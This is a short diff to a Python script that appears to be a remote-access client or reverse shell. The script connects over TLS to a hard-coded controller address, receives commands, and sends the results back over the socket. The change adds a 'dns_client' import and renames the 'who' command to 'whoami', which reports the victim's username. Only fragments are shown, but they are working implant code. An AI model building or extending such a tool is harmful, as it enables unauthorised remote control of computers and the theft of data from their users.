@@ -12,6 +12,7 @@ import ssl
 import subprocess
 import os
 import shutil
+import dns_client
 
 # /!\ MODIFIER @ HOST AVANT D'EXECUTER LE PROGRAMME
 HOST = '192.168.1.6'
@@ -73,7 +74,7 @@ try:
             else:
                 output = f"{cmd[1]} does not exist"
                 wrappedSocket.sendall(output.encode())
-        elif cmd[0] == "who":
+        elif cmd[0] == "whoami":
             output = os.environ.get('USERNAME')
             wrappedSocket.sendall(output.encode())
         else:
